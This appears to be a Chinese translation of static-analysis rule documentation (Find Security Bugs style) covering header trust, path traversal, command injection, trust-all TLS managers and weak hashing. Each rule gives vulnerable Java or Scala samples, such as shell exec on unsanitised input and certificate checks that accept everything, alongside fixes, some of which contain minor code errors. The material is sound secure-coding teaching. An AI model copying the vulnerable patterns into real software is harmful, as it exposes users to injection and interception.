class="headerlink" title="没有做任何安全检查的HTTP头"></a>没有做任何安全检查的HTTP头</h1><p>漏洞特征：SERVLET_HEADER<br>http请求头很容易会被用户所修改。通常，不要假想请求来自于没有被黑客修改的常规浏览器。我建议你，不要相信客户端传递进来的http头部值</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查的Referer值"><a href="#没有做任何安全检查的Referer值" class="headerlink" title="没有做任何安全检查的Referer值"></a>没有做任何安全检查的Referer值</h1><p>漏洞特征：SERVLET_HEADER_REFERER<br>行为：</p><ul><li>如果请求来自于恶意用户，那么Referer的值会是任意的情况。</li><li>如果请求来自于另一个安全的源（https），那么Referer头就是空的。</li></ul><p>建议：</p><ul><li>访问控制不应该基于此标头的值。</li><li>csrf保护不应该仅基于此值。（ <a href="http://www.w3.org/Protocols/HTTP/HTRQ_Headers.html#z14" target="_blank" rel="noopener">因为这个选项</a> ）</li></ul><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="没有做任何安全检查的User-Agent值"><a href="#没有做任何安全检查的User-Agent值" class="headerlink" title="没有做任何安全检查的User-Agent值"></a>没有做任何安全检查的User-Agent值</h1><p>漏洞特征： SERVLET_HEADER_USER_AGENT<br>“User-Agent” 很容易被客户端伪造，不建议基于不同的User-Agent（比如爬虫的UA）来适配不同的行为。</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/807.html" target="_blank" rel="noopener">CWE-807: Untrusted Inputs in a Security Decision</a></p><h1 id="潜在的cookie中包含敏感数据"><a href="#潜在的cookie中包含敏感数据" class="headerlink" title="潜在的cookie中包含敏感数据"></a>潜在的cookie中包含敏感数据</h1><p>漏洞特征： COOKIE_USAGE<br>存储在客户端中cookie的数据不应该包含敏感数据或者与session相关的数据。大多数情况下，敏感数据应该仅仅存储在session中，并且通过通过用户的session值去访问。详细请看HttpSession (HttpServletRequest.getSession())<br>客户端cookie应该是比特定会话维持时间更长且独立于特殊会话</p><p>引用：<br><a href="http://cwe.mitre.org/data/definitions/315.html" target="_blank" rel="noopener">CWE-315: Cleartext Storage of Sensitive Information in a Cookie</a></p><h1 id="潜在的路径穿越（文件读取）"><a href="#潜在的路径穿越（文件读取）" class="headerlink" title="潜在的路径穿越（文件读取）"></a>潜在的路径穿越（文件读取）</h1><p>漏洞特征：PATH_TRAVERSAL_IN<br>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被读取。<br>这个规则识别潜在的路径穿越漏洞。在许多场景中，用户无法控制文件路径，如果有工具报告了这个问题，那么这个就是误报<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">@GET</span><br><span class="line">@Path(&quot;/images/&#123;image&#125;&quot;)</span><br><span class="line">@Produces(&quot;images/*&quot;)</span><br><span class="line">public Response getImage(@javax.ws.rs.PathParam(&quot;image&quot;) String image) &#123;</span><br><span class="line">    File file = new File(&quot;resources/images/&quot;, image); //Weak point</span><br><span class="line"></span><br><span class="line">    if (!file.exists()) &#123;</span><br><span class="line">        return Response.status(Status.NOT_FOUND).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return Response.ok().entity(new FileInputStream(file)).build();</span><br><span class="line">&#125;</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.io.FilenameUtils;</span><br><span class="line"></span><br><span class="line">@GET</span><br><span class="line">@Path(&quot;/images/&#123;image&#125;&quot;)</span><br><span class="line">@Produces(&quot;images/*&quot;)</span><br><span class="line">public Response getImage(@javax.ws.rs.PathParam(&quot;image&quot;) String image) &#123;</span><br><span class="line">    File file = new File(&quot;resources/images/&quot;, FilenameUtils.getName(image)); //Fix</span><br><span class="line"></span><br><span class="line">    if (!file.exists()) &#123;</span><br><span class="line">        return Response.status(Status.NOT_FOUND).build();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return Response.ok().entity(new FileInputStream(file)).build();</span><br><span class="line">&#125;</span><br><span class="line">1234567891011121314</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="潜在的路径穿越（文件写）"><a href="#潜在的路径穿越（文件写）" class="headerlink" title="潜在的路径穿越（文件写）"></a>潜在的路径穿越（文件写）</h1><p>漏洞特征：PATH_TRAVERSAL_OUT<br>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被修改。<br>这个规则识别潜在的路径穿越漏洞。在许多场景中，用户无法控制文件路径，如果有工具报告了这个问题，那么这个就是误报<br>引用：<br>[WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="潜在的路径穿越（文件读取）-1"><a href="#潜在的路径穿越（文件读取）-1" class="headerlink" title="潜在的路径穿越（文件读取）"></a>潜在的路径穿越（文件读取）</h1><p>漏洞特征：SCALA_PATH_TRAVERSAL_IN<br>一个文件被打开，然后读取文件内容，这个文件名来自于一个输入的参数。如果没有过滤这个传入的参数，那么本地文件系统中任意文件都会被读取。<br>这个规则识别潜在的路径穿越漏洞。在许多场景中，用户无法控制文件路径，如果有工具报告了这个问题，那么这个就是误报<br>有漏洞代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">def getWordList(value:String) = Action &#123;</span><br><span class="line">  if (!Files.exists(Paths.get(&quot;public/lists/&quot; + value))) &#123;</span><br><span class="line">    NotFound(&quot;File not found&quot;)</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    val result = Source.fromFile(&quot;public/lists/&quot; + value).getLines().mkString // Weak point</span><br><span class="line">    Ok(result)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.io.FilenameUtils;</span><br><span class="line"></span><br><span class="line">def getWordList(value:String) = Action &#123;</span><br><span class="line">  val filename = &quot;public/lists/&quot; + FilenameUtils.getName(value)</span><br><span class="line"></span><br><span class="line">  if (!Files.exists(Paths.get(filename))) &#123;</span><br><span class="line">    NotFound(&quot;File not found&quot;)</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    val result = Source.fromFile(filename).getLines().mkString // Fix</span><br><span class="line">    Ok(result)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">123456789101112</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC: Path Traversal](<a href="http://projects.webappsec.org/w/page/13246952/Path" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246952/Path</a> Traversal)<br><a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank" rel="noopener">OWASP: Path Traversal</a><br><a href="http://capec.mitre.org/data/definitions/126.html" target="_blank" rel="noopener">CAPEC-126: Path Traversal</a><br><a href="http://cwe.mitre.org/data/definitions/22.html" target="_blank" rel="noopener">CWE-22: Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’)</a></p><h1 id="潜在的命令注入"><a href="#潜在的命令注入" class="headerlink" title="潜在的命令注入"></a>潜在的命令注入</h1><p>漏洞特征：COMMAND_INJECTION<br>高亮部分的api被用来执行系统命令，如果输入这个api的数据没有被过滤，那么就会导致任意命令执行<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import java.lang.Runtime;</span><br><span class="line"></span><br><span class="line">Runtime r = Runtime.getRuntime();</span><br><span class="line">r.exec(&quot;/bin/sh -c some_tool&quot; + input);</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://www.owasp.org/index.php/Command_Injection" target="_blank" rel="noopener">OWASP: Command Injection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="http://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</a></p><h1 id="潜在的命令注入-Scala"><a href="#潜在的命令注入-Scala" class="headerlink" title="潜在的命令注入(Scala)"></a>潜在的命令注入(Scala)</h1><p>漏洞特征：COMMAND_INJECTION<br>高亮部分的api被用来执行系统命令，如果输入这个api的数据没有被过滤，那么就会导致任意命令执行<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def executeCommand(value:String) = Action &#123;</span><br><span class="line">    val result = value.!</span><br><span class="line">    Ok(&quot;Result:\n&quot;+result)</span><br><span class="line">&#125;</span><br><span class="line">1234</span><br></pre></td></tr></table></figure><p>引用：<br><a href="https://www.owasp.org/index.php/Command_Injection" target="_blank" rel="noopener">OWASP: Command Injection</a><br><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection" target="_blank" rel="noopener">OWASP: Top 10 2013-A1-Injection</a><br><a href="http://cwe.mitre.org/data/definitions/78.html" target="_blank" rel="noopener">CWE-78: Improper Neutralization of Special Elements used in an OS Command (‘OS Command Injection’)</a></p><h1 id="文件类函数没有过滤空字符"><a href="#文件类函数没有过滤空字符" class="headerlink" title="文件类函数没有过滤空字符"></a>文件类函数没有过滤空字符</h1><p>漏洞特征：WEAK_FILENAMEUTILS<br>一些文件类中方法没有过滤空字节（0x00）<br>如果空字节被注入到文件名之中，如果这个文件被放进系统之中，那么系统则只会读取空字符之前的文件名，字符串就会被空字符截断，甚至java本身也不能关注空字符或者处理这些特殊情况。操作系统的这一特性通常被用来绕过文件名验证去访问其他的文件（例如，后缀是.log”的文件）。</p><p>给出两点建议去修复这个问题：</p><ul><li>升级到7 update 40 或者最近的版本，或者java 8 +，因为空字节注入这个问题已经被这些版本的java所<a href="http://bugs.java.com/bugdatabase/view_bug.do?bug_id=8014846" target="_blank" rel="noopener">解决</a></li><li>要严格验证用户输入的文件名是否是有效的（例如不能包含空字符，不能包含路径字符）</li></ul><p>如果你知道你使用的现有的java版本可以避免空字符注入问题，你可以忽略上面的问题。</p><p>引用：<br>[WASC-28: Null Byte Injection](<a href="http://projects.webappsec.org/w/page/13246949/Null" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246949/Null</a> Byte Injection)<br><a href="http://cwe.mitre.org/data/definitions/158.html" target="_blank" rel="noopener">CWE-158: Improper Neutralization of Null Byte or NUL Character</a></p><h1 id="证书管理器接受任何证书"><a href="#证书管理器接受任何证书" class="headerlink" title="证书管理器接受任何证书"></a>证书管理器接受任何证书</h1><p>漏洞特征： WEAK_TRUST_MANAGER<br>空的证书管理器通常可以更轻松的连接到没有<a href="http://en.wikipedia.org/wiki/Certificate_authority" target="_blank" rel="noopener">根证书</a>的主机上。结果就是，就会更容易受到中间人攻击，因为客户端信任所有的证书。<br>一个证书管理器应该允许信任指定的一种证书（例如：基于信任库）。下面是一种可行的实现方法：<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class TrustAllManager implements X509TrustManager &#123;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123;</span><br><span class="line">        //Trust any client connecting (no certificate validation)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException &#123;</span><br><span class="line">        //Trust any remote server (no certificate validation)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public X509Certificate[] getAcceptedIssuers() &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">1234567891011121314151617</span><br></pre></td></tr></table></figure><p>解决方案(基于证书库的证书管理器）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">KeyStore ks = //Load keystore containing the certificates trusted</span><br><span class="line"></span><br><span class="line">SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line"></span><br><span class="line">TrustManagerFactory tmf = TrustManagerFactory.getInstance(&quot;SunX509&quot;);</span><br><span class="line">tmf.init(ks);</span><br><span class="line"></span><br><span class="line">sc.init(kmf.getKeyManagers(), tmf.getTrustManagers(),null);</span><br><span class="line"></span><br><span class="line">123456789</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/295.html" target="_blank" rel="noopener">CWE-295: Improper Certificate Validation</a></p><h1 id="HostnameVerifier-接收任何签名证书"><a href="#HostnameVerifier-接收任何签名证书" class="headerlink" title="HostnameVerifier 接收任何签名证书"></a>HostnameVerifier 接收任何签名证书</h1><p>漏洞规则：WEAK_HOSTNAME_VERIFIER<br>因为证书会被很多主机重复使用，接收任意证书的HostnameVerifier经常被使用。结果就是，就会更容易受到中间人攻击，因为客户端信任所有的证书。<br>一个证书管理器应该允许信任指定的一种证书（例如：基于信任库）。应该创建通配符证书，可以允许多个子域下证书。下面是一种可行的实现方法：<br>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public class AllHosts implements HostnameVerifier &#123;</span><br><span class="line">    public boolean verify(final String hostname, final SSLSession session) &#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>解决方案(基于证书库的证书管理器）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">KeyStore ks = //Load keystore containing the certificates trusted</span><br><span class="line"></span><br><span class="line">SSLContext sc = SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line"></span><br><span class="line">TrustManagerFactory tmf = TrustManagerFactory.getInstance(&quot;SunX509&quot;);</span><br><span class="line">tmf.init(ks);</span><br><span class="line"></span><br><span class="line">sc.init(kmf.getKeyManagers(), tmf.getTrustManagers(),null);</span><br><span class="line">12345678</span><br></pre></td></tr></table></figure><p>引用：<br>[WASC-04: Insufficient Transport Layer Protection](<a href="http://projects.webappsec.org/w/page/13246945/Insufficient" target="_blank" rel="noopener">http://projects.webappsec.org/w/page/13246945/Insufficient</a> Transport Layer Protection)<br><a href="http://cwe.mitre.org/data/definitions/295.html" target="_blank" rel="noopener">CWE-295: Improper Certificate Validation</a></p><h1 id="发现JAX-RS-REST服务器端"><a href="#发现JAX-RS-REST服务器端" class="headerlink" title="发现JAX-RS REST服务器端"></a>发现JAX-RS REST服务器端</h1><p>漏洞规则： JAXRS_ENDPOINT<br>这些函数是REST Web Service 的一部分(JSR311).<br>这个网站的安全性应该被分析。例如：</p><ul><li>权限认证，如果强制实施，就应该被测试</li><li>访问控制，如果强制实施，就应该被测试</li><li>输入应该被追踪，因为可能会有潜在的漏洞</li><li>聊天程序应该使用SSL</li><li>如果服务器支持存储私人数据（例如，通过POST），应该调查它是否对csrf有防御</li></ul><p>引用：<br><a href="https://www.owasp.org/index.php/REST_Assessment_Cheat_Sheet" target="_blank" rel="noopener">OWASP: REST Assessment Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/REST_Security_Cheat_Sheet" target="_blank" rel="noopener">OWASP: REST Security Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Web_Service_Security_Cheat_Sheet" target="_blank" rel="noopener">OWASP: Web Service Security Cheat Sheet</a><br><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)" target="_blank" rel="noopener">OWASP: Cross-Site Request Forgery</a><br><a href="https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet" target="_blank" rel="noopener">OWASP: CSRF Prevention Cheat Sheet</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="发现Tapestry页面"><a href="#发现Tapestry页面" class="headerlink" title="发现Tapestry页面"></a>发现Tapestry页面</h1><p>漏洞规则： TAPESTRY_ENDPOINT<br>在应用启动的时候，Tapestry会被发现。Tapestry应用的每一个页面又后端java类和相关的Tapestry标记语言构成（a.tml 文件）。当请求到达的时候，GET/POST参数会被映射到后端的java类之中。映射可以使用fieldName完成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">    protected String input;</span><br><span class="line">[...]</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>或者显示注释的定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[...]</span><br><span class="line">    @org.apache.tapestry5.annotations.Parameter</span><br><span class="line">    protected String parameter1;</span><br><span class="line"></span><br><span class="line">    @org.apache.tapestry5.annotations.Component(id = &quot;password&quot;)</span><br><span class="line">    private PasswordField passwordField;</span><br><span class="line">[...]</span><br><span class="line">1234567</span><br></pre></td></tr></table></figure><p>这个页面被映射到视图中[/resources/package/PageName].tml.</p><p>在应用中的每一个Tapestry页面应该被调查，确保所有的输入都能被自动的映射，并在这些参数被使用之前都是有效的。<br>引用：<br><a href="http://tapestry.apache.org/" target="_blank" rel="noopener">Apache Tapestry Home Page</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="发现Wicket的web页面"><a href="#发现Wicket的web页面" class="headerlink" title="发现Wicket的web页面"></a>发现Wicket的web页面</h1><p>漏洞特征：WICKET_ENDPOINT<br>这个类代表一个Wicket web页面。输入的数据会被来自实例中的PageParameters读取，然后把它们送入后端处理程序。当前页面会被映射到视图之中[/package/WebPageName].html.<br>在应用中的每一个Wicket页面应该被调查，确保所有的输入都能被自动的映射，并在这些参数被使用之前都是有效的。<br>引用：<br><a href="https://wicket.apache.org/" target="_blank" rel="noopener">Apache Wicket Home Page</a><br><a href="http://cwe.mitre.org/data/definitions/20.html" target="_blank" rel="noopener">CWE-20: Improper Input Validation</a></p><h1 id="MD2-MD4-和-MD5都是脆弱的哈希函数"><a href="#MD2-MD4-和-MD5都是脆弱的哈希函数" class="headerlink" title="MD2, MD4 和 MD5都是脆弱的哈希函数"></a>MD2, MD4 和 MD5都是脆弱的哈希函数</h1><p>漏洞特征：WEAK_MESSAGE_DIGEST_MD5<br>不建议使用MD2, MD4 和 MD5这个摘要算法。应该使用PBKDF2作为密码的摘要算法。<br>md5哈希算法的安全性被严重损害。现已存在一种碰撞攻击，这种攻击可以用奔腾2.6 GHz 4核处理器在几秒内碰撞出另一个哈希相同的字符串。进一步来说，还有选择前缀碰撞攻击（chosen-prefix collision attack ），这种攻击能在一个小时之内找到两个前缀相同的哈希，只要现有计算机的计算水平就可以达到。</p><p><strong>“SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256:</strong><br>所有散列计算程序都支持这些哈希函数的使用。<br>NISI:通信传输：[传输中建议使用的加密算法和密钥长度](<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）" target="_blank" rel="noopener">http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）</a></p><p>PBKDF的主要思想是减缓字典生成的时间或者增加攻击者攻击每一个密码的时间。攻击者会有一个密码表去爆破PBKDF所使用的迭代计数器和salt。因为攻击者必须花费大量的计算时间去尝试破解每一个密码，所以攻击者很难用字典攻击和爆破攻击去获得成功。<br>NISI:<a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">基于密码的密钥的加密建议</a></p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest md5Digest = MessageDigest.getInstance(&quot;MD5&quot;);</span><br><span class="line">    md5Digest.update(password.getBytes());</span><br><span class="line">    byte[] hashValue = md5Digest.digest();</span><br><span class="line">123</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA256Digest());</span><br><span class="line">    gen.init(password.getBytes(&quot;UTF-8&quot;), salt.getBytes(), 4096);</span><br><span class="line">    return ((KeyParameter) gen.generateDerivedParameters(256)).getKey();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>解决方案（java 8 和之后的版本）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    KeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 4096, 256 * 8);</span><br><span class="line">    SecretKeyFactory f = SecretKeyFactory.getInstance(&quot;PBKDF2WithHmacSHA256&quot;);</span><br><span class="line">    return f.generateSecret(spec).getEncoded();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>引用：<br>[1] [On Collisions for MD5](<a href="http://www.win.tue.nl/hashclash/On" target="_blank" rel="noopener">http://www.win.tue.nl/hashclash/On</a> Collisions for MD5 - M.M.J. Stevens.pdf): Master Thesis by M.M.J. Stevens<br>[2] [Chosen-prefix collisions for MD5 and applications](<a href="http://homepages.cwi.nl/~stevens/papers/stJOC" target="_blank" rel="noopener">http://homepages.cwi.nl/~stevens/papers/stJOC</a> - Chosen-Prefix Collisions for MD5 and Applications.pdf): Paper written by Marc Stevens<br>Wikipedia: MD5<br><a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf" target="_blank" rel="noopener">NIST: Transitions: Recommendation for Transitioning the Use of Cryptographic Algorithms and Key Lengths</a><br><a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">NIST: Recommendation for Password-Based Key Derivation</a><br><a href="https://stackoverflow.com/q/22580853/89769" target="_blank" rel="noopener">Stackoverflow: Reliable implementation of PBKDF2-HMAC-SHA256 for Java</a><br><a href="http://cwe.mitre.org/data/definitions/327.html" target="_blank" rel="noopener">CWE-327: Use of a Broken or Risky Cryptographic Algorithm</a></p><h1 id="SHA-1-是脆弱的哈希算法"><a href="#SHA-1-是脆弱的哈希算法" class="headerlink" title="SHA-1 是脆弱的哈希算法"></a>SHA-1 是脆弱的哈希算法</h1><p>漏洞特征： WEAK_MESSAGE_DIGEST_SHA1<br>不建议使用SHA-1算法去加密密码、做数字签名和其他用途。应该使用PBKDF2作为密码的摘要算法。</p><p><strong>“SHA-1用于生成电子签名：</strong><br>SHA-1可能仅仅用于NIST指导的特殊协议的电子签名的生成。但是在其他的应用中，SHA-1 不应该用于电子签名</p><p><strong>SHA-1用于电子签名的验证：</strong><br>对于电子签名的验证，SHA-1可以被用于传统应用<br><strong>“SHA-224, SHA-256, SHA-384, SHA-512, SHA-512/224, and SHA-512/256:</strong><br>所有散列计算程序都支持这些哈希函数的使用。<br>NISI:通信传输：[传输中建议使用的加密算法和密钥长度](<a href="http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）" target="_blank" rel="noopener">http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf）</a></p><p>PBKDF的主要思想是减缓字典生成的时间或者增加攻击者攻击每一个密码的时间。攻击者会有一个密码表去爆破PBKDF所使用的迭代计数器和salt。因为攻击者必须花费大量的计算时间去尝试破解每一个密码，所以攻击者很难用字典攻击和爆破攻击去获得成功。<br>NISI:<a href="http://csrc.nist.gov/publications/nistpubs/800-132/nist-sp800-132.pdf" target="_blank" rel="noopener">基于密码的密钥的加密建议</a></p><p>有漏洞的代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MessageDigest sha1Digest = MessageDigest.getInstance(&quot;SHA1&quot;);</span><br><span class="line">sha1Digest.update(password.getBytes());</span><br><span class="line">byte[] hashValue = sha1Digest.digest();</span><br><span class="line">123</span><br><span class="line">byte[] hashValue = DigestUtils.getSha1Digest().digest(password.getBytes());</span><br><span class="line">1</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public static byte[] getEncryptedPassword(String password, byte[] salt) throws NoSuchAlgorithmException, InvalidKeySpecException &#123;</span><br><span class="line">    PKCS5S2ParametersGenerator gen = new PKCS5S2ParametersGenerator(new SHA256Digest());</span><br><span class="line">    gen.init(password.getBytes(&quot;UTF-8&quot;), salt.getBytes(), 4096);</span><br><span class="line">    return ((KeyParameter) gen.generateDerivedParameters(256)).getKey();</span><br><span class="line">&#125;</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>解决方案（java 8 及以后的版本）</p><figure class="highlight 